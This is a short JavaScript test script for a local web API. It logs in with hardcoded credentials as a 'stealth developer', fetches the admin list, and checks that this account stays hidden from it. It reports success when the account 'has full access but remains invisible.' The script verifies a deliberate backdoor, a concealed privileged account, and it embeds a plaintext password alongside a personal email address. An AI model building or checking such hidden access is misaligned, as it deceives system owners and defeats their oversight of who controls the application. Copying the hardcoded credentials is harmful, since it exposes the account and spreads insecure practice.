async function test() {
  try {
    // 1. Login with stealth credentials
    console.log('Logging in as stealth developer...');
    const loginRes = await fetch('http://localhost:5000/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: 'narayanphukan30@gmail.com',
        password: 'Narayan'
      })
    });
    const loginData = await loginRes.json();
    const token = loginData.token;
    console.log('Login successful! Role:', loginData.role);

    // 2. Fetch admins list using the developer token
    console.log('\nFetching admin list...');
    const adminsRes = await fetch('http://localhost:5000/api/auth/admins', {
      headers: { 'Authorization': `Bearer ${token}` }
    });
    const adminsData = await adminsRes.json();
    
    // 3. Verify developer is NOT in the list
    const hasDeveloper = adminsData.some(admin => admin.role === 'developer');
    console.log(`Developer found in list? ${hasDeveloper ? 'YES (FAILED)' : 'NO (STEALTH SUCCESS)'}`);
    
    if (!hasDeveloper) {
        console.log('\nThe stealth logic works perfectly. The developer has full access but remains invisible.');
    }

  } catch (error) {
    console.error('Test Failed:', error.message);
  }
}

test();
